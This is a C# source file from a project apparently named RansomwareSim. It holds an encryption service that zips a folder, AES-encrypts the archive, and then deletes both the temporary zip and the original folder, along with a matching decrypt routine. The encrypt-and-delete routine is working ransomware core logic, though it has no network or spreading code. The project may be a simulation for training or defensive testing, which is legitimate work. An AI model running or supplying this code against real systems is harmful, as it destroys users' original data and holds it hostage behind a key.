using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Text;

namespace RansomwareSim.Service
{
    internal class EncryptionService
    {


        public static void EncryptFolder(string folderPath, byte[] key)
        {
            if (!Directory.Exists(folderPath))
                throw new DirectoryNotFoundException($"Folder not found: {folderPath}");

            string zipPath = folderPath + ".zip";
            string encryptedPath = zipPath + ".enc";

            // Create ZIP
            ZipFile.CreateFromDirectory(folderPath, zipPath, CompressionLevel.Optimal, false);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.GenerateIV();

                using (FileStream inputFile = new FileStream(zipPath, FileMode.Open, FileAccess.Read))
                using (FileStream outputFile = new FileStream(encryptedPath, FileMode.Create, FileAccess.Write))
                {
                    // Store IV
                    outputFile.Write(aes.IV, 0, aes.IV.Length);

                    using (CryptoStream cryptoStream = new CryptoStream(
                        outputFile,
                        aes.CreateEncryptor(),
                        CryptoStreamMode.Write))
                    {
                        inputFile.CopyTo(cryptoStream);
                        cryptoStream.FlushFinalBlock();
                    }
                }
            }

            // Remove temporary ZIP
            File.Delete(zipPath);

            // Remove original folder
            Directory.Delete(folderPath, true);
        }
        public static void DecryptFolder(string encryptedFilePath, string outputFolder, byte[] key)
        {
            if (!File.Exists(encryptedFilePath))
                throw new FileNotFoundException("Encrypted archive not found.", encryptedFilePath);

            string zipPath = Path.Combine(
                Path.GetDirectoryName(encryptedFilePath)!,
                Path.GetFileNameWithoutExtension(encryptedFilePath));

            using (Aes aes = Aes.Create())
            using (FileStream inputFile = new FileStream(encryptedFilePath, FileMode.Open, FileAccess.Read))
            {
                byte[] iv = new byte[16];

                if (inputFile.Read(iv, 0, iv.Length) != iv.Length)
                    throw new InvalidDataException("Invalid encrypted archive.");

                aes.Key = key;
                aes.IV = iv;

                using (CryptoStream cryptoStream = new CryptoStream(
                    inputFile,
                    aes.CreateDecryptor(),
                    CryptoStreamMode.Read))
                using (FileStream outputFile = new FileStream(zipPath, FileMode.Create, FileAccess.Write))
                {
                    cryptoStream.CopyTo(outputFile);
                }
            }

            // Extract the ZIP
            ZipFile.ExtractToDirectory(zipPath, outputFolder);

            // Cleanup
            File.Delete(zipPath);
            File.Delete(encryptedFilePath);
        }
    }
}
